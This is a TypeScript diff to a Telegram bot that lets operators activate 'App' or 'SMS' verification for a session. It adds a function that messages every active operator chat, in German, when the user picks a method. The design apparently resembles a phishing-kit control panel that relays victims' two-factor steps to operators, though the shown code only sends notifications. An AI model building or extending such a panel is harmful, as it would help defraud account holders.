@@ -102,9 +102,13 @@ async function handleCallbackQuery(callbackQuery: any) {
             break;
           case 'app_confirmation':
             successMessage = `✅ **App Verification Activated**\n\nSession: \`${sessionId}\`\nApp confirmation is now active.`;
+            // Send notification when customer chooses App
+            await sendMethodChoiceNotification(sessionId, 'app');
             break;
           case 'sms_confirmation':
             successMessage = `✅ **SMS Verification Activated**\n\nSession: \`${sessionId}\`\nSMS confirmation is now active.`;
+            // Send notification when customer chooses SMS
+            await sendMethodChoiceNotification(sessionId, 'sms');
             break;
           default:
             successMessage = `✅ Verification method set to: ${method}`;
@@ -364,4 +368,30 @@ function getCompletionButtons(sessionId: string) {
       ]
     ]
   };
+}
+
+async function sendMethodChoiceNotification(sessionId: string, method: 'app' | 'sms') {
+  try {
+    // Get all active chat IDs
+    const { data: activeChatIds, error } = await supabase.functions.invoke('get-active-chat-ids');
+    
+    if (error || !activeChatIds) {
+      console.error('Error getting active chat IDs:', error);
+      return;
+    }
+
+    const methodText = method === 'app' ? 'App-Verification' : 'SMS-Verification';
+    const emoji = method === 'app' ? '📱' : '💬';
+    
+    const message = `${emoji} **Nutzer hat ${methodText} gewählt**\n\nSession: \`${sessionId}\`\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
+
+    // Send notification to all active chat IDs
+    for (const chatId of activeChatIds) {
+      await sendTelegramMessage(chatId, message);
+    }
+    
+    console.log(`Method choice notification sent for session ${sessionId}, method: ${method}`);
+  } catch (error) {
+    console.error('Error sending method choice notification:', error);
+  }
 }
